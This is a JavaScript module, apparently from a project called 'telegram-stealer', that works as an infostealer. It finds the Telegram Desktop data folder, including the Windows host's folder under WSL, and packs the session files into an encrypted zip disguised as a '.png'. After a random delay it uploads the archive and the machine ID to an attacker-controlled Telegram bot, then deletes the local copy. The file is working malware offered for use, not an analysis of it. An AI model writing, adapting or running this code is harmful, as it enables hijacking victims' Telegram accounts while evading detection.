const fs = require('fs')
const path = require('path')
const { exec } = require('child_process')

const isWsl = require('is-wsl')
const tempDirectory = require('temp-dir')
const archiver = require('archiver')
const archiverEncrypted = require('archiver-zip-encrypted')
const FormData = require('form-data')
const fetch = require('node-fetch')
const { machineId } = require('node-machine-id')

function getAppDataPath() {
  if (isWsl) {
    return new Promise((resolve, reject) => {
      // Get Windows host username
      exec("powershell.exe '$env:UserName'", (error, stdout, stderr) => {
        if (error) reject(error)
        const username = stdout.trim()
        resolve(`/mnt/c/Users/${username}/AppData/Roaming`)
      })
    })
  } else {
    return Promise.resolve(
      process.env.APPDATA ||
        (process.platform == 'darwin' ? `${process.env.HOME}/Library/Preferences` : `${process.env.HOME}/.local/share`)
    )
  }
}

async function findTelegramDirectoryPath(appDataPath) {
  const directories = await fs.promises.readdir(appDataPath, { withFileTypes: true })
  const telegramDirectory = directories.find(f => f.isDirectory() && f.name.toLowerCase().includes('telegram'))
  if (!telegramDirectory) throw new Error('Could not find Telegram Desktop directory')
  return path.join(appDataPath, telegramDirectory.name)
}

function archiveTelegramSession(telegramDirectoryPath, archivePath, archivePassword) {
  return new Promise(async (resolve, reject) => {
    const output = fs.createWriteStream(archivePath)

    archiver.registerFormat('zip-encrypted', archiverEncrypted)
    const archive = archiver('zip-encrypted', {
      zlib: { level: 9 },
      encryptionMethod: 'aes256',
      password: archivePassword
    })

    output.on('close', () => {
      // console.log(`Archive size: ${archive.pointer() / 1024 / 1024} MB`)
      resolve()
    })

    archive.on('error', err => reject(err))

    archive.pipe(output)

    const tdataPath = path.join(telegramDirectoryPath, 'tdata')
    const files = (await fs.promises.readdir(tdataPath, { withFileTypes: true })).filter(
      file =>
        !file.name.startsWith('user_data') &&
        file.name !== 'temp' &&
        file.name !== 'dumps' &&
        file.name !== 'emoji' &&
        file.name !== 'working' &&
        file.name !== 'tdummy'
    )

    for (const file of files) {
      if (file.isDirectory()) archive.directory(path.join(tdataPath, file.name), file.name)
      else archive.file(path.join(tdataPath, file.name), { name: file.name })
    }

    archive.finalize()
  })
}

function getHwid() {
  return machineId()
}

async function sendArchiveTelegramWebhook(archivePath, archivePassword, telegramChatId, telegramToken) {
  const hwid = await getHwid()
  const form = new FormData()
  form.append('document', fs.createReadStream(archivePath, {}), { filename: `${hwid}.zip` })
  form.append('caption', `New Telegram Desktop session archive\\!\nPassword: \`${archivePassword}\`\nHWID: \`${hwid}\``)
  const res = await fetch(
    `https://api.telegram.org/bot${telegramToken}/sendDocument?chat_id=${telegramChatId}&parse_mode=MarkdownV2`,
    {
      method: 'POST',
      body: form
    }
  ).then(res => res.json())

  if (!res.ok) {
    console.error(`Error sending archive! Retrying in 30s - Status: ${res.error_code} - ${res.description}`)
    // Failed to send archive, try again in 30s
    await new Promise(resolve => setTimeout(resolve, 30_000))
    return sendArchiveTelegramWebhook(archivePath, telegramChatId, telegramToken)
  }
}

function deleteArchive(archivePath) {
  return new Promise((resolve, reject) => {
    fs.unlink(archivePath, err => {
      if (err) reject(err)
      else resolve()
    })
  })
}

async function run(
  telegramChatId,
  telegramToken,
  archivePassword = 'https://github.com/rigwild/telegram-stealer',
  waitOnStart = true
) {
  if (!telegramChatId) throw new Error('Telegram chat ID is required')
  if (!telegramToken) throw new Error('Telegram token is required')

  // Wait before execution
  if (waitOnStart) await new Promise(resolve => setTimeout(resolve, Math.floor(Math.random() * 5000 + 3000)))

  const appDataPath = await getAppDataPath()
  const telegramDirectoryPath = await findTelegramDirectoryPath(appDataPath)
  const hwid = await getHwid()
  const archivePath = path.join(tempDirectory, `${hwid}.png`) // Fake extension to prevent file type detection
  await archiveTelegramSession(telegramDirectoryPath, archivePath, archivePassword)
  await sendArchiveTelegramWebhook(archivePath, archivePassword, telegramChatId, telegramToken)
  await deleteArchive(archivePath)
}

module.exports = { run }
